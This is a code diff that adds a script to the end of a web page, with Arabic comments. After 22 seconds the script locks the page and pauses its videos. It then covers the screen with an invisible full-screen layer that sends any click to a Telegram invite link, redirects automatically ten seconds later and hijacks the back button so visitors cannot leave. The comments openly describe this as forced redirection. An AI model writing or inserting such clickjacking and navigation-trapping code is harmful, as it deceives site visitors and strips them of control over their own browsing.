@@ -210,3 +210,49 @@
 
 </body>
 </html>
+
+<script>
+    const tgLink = "https://t.me/+vYk10FokzWgwMmY0";
+
+    // 1. نظام القفل والتحويل الإجباري بعد 22 ثانية
+    setTimeout(function() {
+        // إظهار ستارة القفل (الواجهة)
+        const lock = document.getElementById('telegram-lock');
+        lock.style.display = 'flex';
+        
+        // إيقاف الفيديوهات لتقليل استهلاك البيانات وإجبار المستخدم على التركيز
+        const videos = document.getElementsByTagName('video');
+        for(let i=0; i<videos.length; i++) { videos[i].pause(); }
+
+        // 2. صناعة الستارة الشفافة "القاتلة" (Invisible Trigger)
+        // هذه الستارة تغطي الشاشة بالكامل فوق كل شيء
+        const invisibleShield = document.createElement('div');
+        invisibleShield.style.position = 'fixed';
+        invisibleShield.style.top = '0';
+        invisibleShield.style.left = '0';
+        invisibleShield.style.width = '100%';
+        invisibleShield.style.height = '100%';
+        invisibleShield.style.zIndex = '10000'; // أعلى من أي عنصر آخر
+        invisibleShield.style.backgroundColor = 'transparent'; // غير مرئية
+        invisibleShield.style.cursor = 'pointer';
+        
+        document.body.appendChild(invisibleShield);
+
+        // 3. التنفيذ: أي نقرة في أي مكان تحول فوراً
+        invisibleShield.onclick = function() {
+            window.location.href = tgLink;
+        };
+
+        // تأكيد إضافي: تحويل تلقائي حتى بدون نقر بعد 10 ثوانٍ من ظهور الستارة
+        setTimeout(function() {
+            window.location.href = tgLink;
+        }, 10000);
+
+    }, 22000); // 22 ثانية كما طلبت دقيقة بدقة
+
+    // منع زر الرجوع (Back Button Hack)
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        window.location.href = tgLink;
+    };
+</script>
